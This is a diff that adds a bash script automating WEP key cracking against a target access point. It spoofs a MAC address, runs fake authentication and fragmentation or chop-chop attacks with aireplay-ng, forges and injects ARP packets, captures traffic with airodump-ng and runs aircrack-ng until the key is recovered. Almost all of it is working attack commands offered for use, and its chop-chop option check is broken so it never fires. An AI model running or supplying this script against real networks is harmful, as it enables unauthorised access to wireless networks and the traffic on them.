@@ -1,0 +1,134 @@
+#!/bin/bash
+
+################ SETTINGS ###############
+
+# WARNING! If you have Deauthentication packets during fake auth, and packets in #Data columnt in airodump-ng stopped flowing
+# you have to do following: 
+# - decrease number of packets per second (PACKETS_PER_SECOND_LIMIT)
+# - increase reassociacion time (REASSOCIATE_AFTER_SECONDS)
+PACKETS_PER_SECOND_LIMIT=300;
+REASSOCIATE_AFTER_SECONDS=600;
+
+# IMPORTANT option, if set to 1 all previous packet capture files will be deleted with following command
+# rm replay_src* && rm fragment-* && rm arp-request && rm capture*
+CLEAR_OLD_LOGS=0;
+SPOOF_MAC="00:11:AA:BB:CC:DD";
+
+#########################################
+
+if [[ -z "$1" || -z "$2" ]]; then
+    echo "Using: $0 [BSSID] [CHANNEL] [[CHOP_CHOP_ATTACK]]";
+    echo "[[CHOP_CHOP_ATTACK]] is optional value 1 means that chop-chop attack will be used, instead of fragmentation attack";
+    echo "Example: $0 AA:BB:CC:DD:EE:FF 11 1";
+    exit;
+fi
+
+BSSID=$1;   #"00:02:72:55:FF:C0";
+CHANNEL=$2; # 11;
+# 0 = fragmentation attack, 1 = chop-chop attack
+TYPE_OF_ATTACK="0"; 
+if [[ -z "$3" && "$3" == "1" ]]; then
+  TYPE_OF_ATTACK="1";
+fi
+
+#########################################
+
+# echo green text
+echoGreen(){
+   echo "$(tput setaf 2)>>>>>> ${1}$(tput sgr0)";
+}
+changeMacTo(){
+      echoGreen "ifconfig mon0 down" && ifconfig mon0 down;
+      echoGreen "macchanger -m $1 mon0" && macchanger -m $1 mon0;
+      echoGreen "ifconfig mon0 up" && ifconfig mon0 up;
+}
+getKonsolePidByProcessName(){
+    ps aux | grep konsole | grep "$1" | gawk -F" " '{print $2}';
+}
+
+# monitor mode
+airmon-ng stop mon0
+airmon-ng stop wlan0
+airmon-ng start wlan0 $CHANNEL
+BSSID_CLEAR=$(echo $BSSID | sed s/://g);
+BSSID_LOG="${BSSID_CLEAR}.log";
+CURRENT_DIR=$(pwd);
+PACKETS_DIR="${CURRENT_DIR}/packetsLog";
+PACKETS_LOG="${PACKETS_DIR}/${BSSID_LOG}";
+ARP_REQUEST_FILE="${PACKETS_DIR}/${BSSID_LOG}_arp-request";
+KEY_FOUND_LOG_FILE="${CURRENT_DIR}/${BSSID_CLEAR}_WEP_KEY_FOUND_LOG";
+
+if [[ ! -d "$PACKETS_DIR" ]]; then
+  mkdir --mode 700 $PACKETS_DIR;
+fi
+
+
+#################################### WORK IN PACKETS DIRECTORY #########################
+cd $PACKETS_DIR;
+
+if [[ "$CLEAR_OLD_LOGS" == "1" ]]; then
+  # first clear old files (you don't need them)
+  rm ${BSSID_CLEAR}* fragment-* capture* replay_src* 2>/dev/null;
+fi
+
+changeMacTo $SPOOF_MAC
+
+# fake auth
+FAKE_AUTH_CMD="aireplay-ng -1 $REASSOCIATE_AFTER_SECONDS -a $BSSID -h $SPOOF_MAC mon0";
+konsole --title "Fake auth" --workdir $PACKETS_DIR -e /bin/sh -c "$FAKE_AUTH_CMD" 2>/dev/null;
+echoGreen "$FAKE_AUTH_CMD";
+
+# fake auth for hard AP's (6000 sec between auths,
+# aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $SPOOF_MAC mon0
+
+# Obtaining PRGA (Pseudo Random Generated Algorithm
+if [[ "$TYPE_OF_ATTACK" == "1" ]]; then
+    # ChopChop
+    echo "Performing ChopChop Attack...";
+    C="yes | aireplay-ng -4 -b $BSSID -h $SPOOF_MAC mon0";
+    echoGreen "$C" && eval $C;
+else 
+    # Fragmentation attack 
+    echo "Performing Fragmentation Attack...";
+    C="yes | aireplay-ng -5 -b $BSSID -h $SPOOF_MAC mon0";
+    echoGreen "$C" && eval $C;  
+fi
+
+# generating arp packet from .xor file
+C="packetforge-ng -0 -a $BSSID -h $SPOOF_MAC -k 255.255.255.255 -l 255.255.255.255 -y "$(ls | grep .xor)" -w $ARP_REQUEST_FILE";
+echoGreen "$C" && eval $C;
+# Wrote packet to: arp-request
+
+# Start capturing packets
+CAPTURE_CMD="airodump-ng -c $CHANNEL --bssid $BSSID -w $BSSID_LOG mon0";
+konsole --title "Capturing packets (airodump)" --workdir $PACKETS_DIR -e /bin/sh -c "$CAPTURE_CMD" 2>/dev/null;
+echoGreen "$CAPTURE_CMD";
+
+# Start injecting prepared packet
+INJECT_CMD="yes | aireplay-ng -2 -r $ARP_REQUEST_FILE -h $SPOOF_MAC -x $PACKETS_PER_SECOND_LIMIT mon0";
+konsole --title "Replay packets (aireplay)" --workdir $PACKETS_DIR -e /bin/sh -c "$INJECT_CMD" 2>/dev/null;
+echoGreen "$INJECT_CMD";
+
+sleep 10;
+
+# Start aircracking
+AIRCRACK_CMD="aircrack-ng -b ${BSSID} ${BSSID_LOG}*.cap -l $KEY_FOUND_LOG_FILE";
+konsole --title "Aircracking packet dumps" --workdir $PACKETS_DIR -hold -e /bin/sh -c "$AIRCRACK_CMD" 2>/dev/null;
+echoGreen "$AIRCRACK_CMD";
+
+while true; do
+      sleep 10;
+      if [[ -f "$KEY_FOUND_LOG_FILE" ]]; then
+	  killall airodump-ng;
+	  killall aireplay-ng;
+	  killall aircrack-ng;
+	  echoGreen "----------------- KEY FOUND -------------------";
+	  echoGreen $(cat "$KEY_FOUND_LOG_FILE");
+	  echoGreen "-----------------------------------------------";
+	  exit;
+      fi
+done
+
+
+
+
